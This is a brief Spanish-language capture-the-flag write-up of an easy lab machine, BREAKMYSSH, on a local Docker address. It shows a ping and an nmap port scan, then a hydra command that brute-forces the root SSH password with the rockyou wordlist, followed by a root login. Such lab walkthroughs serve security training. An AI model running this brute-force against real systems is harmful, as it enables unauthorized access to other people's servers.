---
description: 'Dificultad: Muy fácil'
---

# Máquina BREAKMYSSH

Fecha: 14 de Marzo de 2025

Objetivo: 172.17.0.2

***

## Fase de reconocimiento

Comenzamos haciendo un ping a la máquina para ver si nos contesta y está encendida.

```
ping 172.17.0.2
```

Ok, la máquina está encendida, podemos comenzar la fase de reconocimiento.

Proseguimos con un nmap para ver los puertos, sistema operativo, etc. Ejecutamos el comando nmap:

```
nmap -p- -O -v 172.17.0.2
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption><p>Salida del comando NMAP</p></figcaption></figure>

Vemos que solo nos ha arrojado que únicamente esta máquina tiene abierto el puerto 22.

Si hacemos directamente un ataque con hydra, podemos terminar, pero quería aprovechar para instalar Metasploit.

```
 hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption><p>Salida del comando hydra</p></figcaption></figure>

Fase de Post-Explotación

Ahora vendría la fase donde nos conectamos a la máquina por SSH para verificar que realmente hemos obtenido permisos de root.

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption><p>Conexión como usuario root</p></figcaption></figure>

Y efectivamente así termina esta máquina sin escalada de privilegios.





